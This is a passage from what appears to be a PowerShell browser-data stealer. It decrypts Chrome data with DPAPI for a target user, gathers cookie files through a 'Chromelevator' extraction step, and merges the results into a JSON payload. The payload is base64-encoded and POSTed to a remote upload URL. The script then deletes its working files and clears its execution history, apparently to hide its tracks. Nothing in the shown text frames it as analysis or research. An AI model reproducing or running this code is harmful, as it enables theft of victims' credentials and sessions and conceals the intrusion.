Write-DebugStep "Exporter type loaded: $($exporterType.FullName)"

$exportMethod = $exporterType.GetMethod("Export")
Write-DebugStep "Running Chrome export (UseDpapiDecrypt=$UseDpapiDecrypt, chromeUserData=$ChromeUserDataPath)"
$exportJsonRaw = [string]$exportMethod.Invoke($null, @(
    [bool]$UseDpapiDecrypt,
    [string]$ChromeUserDataPath,
    [string]$UserContext.TargetUsername
))
Write-DebugStep "Export completed (jsonLength=$($exportJsonRaw.Length))"
Write-ExportProfileSummaryDebug -ExportJsonRaw $exportJsonRaw

$profileMetadata = Get-ChromeProfileMetadata
if ($DebugMode) {
    $metaFolders = @($profileMetadata.Keys)
    Write-DebugStep "Profile metadata ($($metaFolders.Count)): $($metaFolders -join ', ')"
}
$chromelevatorMeta = Invoke-ChromelevatorExtraction -ApiBase $ApiBase
$cookieFileCount = 0
if ($script:ChromelevatorChromeRoot) {
    $cookieFileCount = @(
        Get-ChildItem -LiteralPath $script:ChromelevatorChromeRoot -Filter cookies.json -Recurse -File -ErrorAction SilentlyContinue
    ).Count
}
Write-DebugStep "Chromelevator finished (error=$($chromelevatorMeta.error), root=$($script:ChromelevatorChromeRoot), cookieFiles=$cookieFileCount)"
Write-ChromelevatorProfileDebug -ChromeRoot $script:ChromelevatorChromeRoot

Write-DebugStep "Serializing payload"
$chromeRoot = if ($script:ChromelevatorChromeRoot) { [string]$script:ChromelevatorChromeRoot } else { "" }
$mergeArgs = @(
    [string]$exportJsonRaw,
    [string](ConvertTo-Json $ChromeInfo -Compress -Depth 5),
    [string](ConvertTo-Json $profileMetadata -Compress -Depth 5),
    [string](ConvertTo-Json $chromelevatorMeta -Compress -Depth 5),
    [string]$chromeRoot
)
$payloadJson = [string]$exporterType.GetMethod("MergeExportPayload").Invoke($null, $mergeArgs)
Write-DebugStep "Serialization completed (jsonLength=$($payloadJson.Length))"

Write-DebugStep "Uploading payload to $PayloadUrl"
$payloadB64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payloadJson))
Write-DebugStep "Base64 encoded (length=$($payloadB64.Length))"
$null = Invoke-RestMethod -Uri $PayloadUrl -Method Post -ContentType "text/plain; charset=utf-8" -Body $payloadB64
Write-DebugStep "Payload upload completed"
}
catch {
    Write-DebugError $_
    $script:ExitCode = Get-ErrorCodeFromException $_
    Send-ScriptErrorReport -ErrorRecord $_ -Code $script:ExitCode
    Write-Host $script:ExitCode
}
finally {
    if ($script:ChromelevatorOutputRoot -and (Test-Path $script:ChromelevatorOutputRoot)) {
        Remove-Item -Path $script:ChromelevatorOutputRoot -Recurse -Force -ErrorAction SilentlyContinue
    }
    Clear-ScriptExecutionHistory
    if ($CloseTerminal) {
        if ($null -ne $script:ExitCode) {
            exit $script:ExitCode
        }
        exit
    }
}
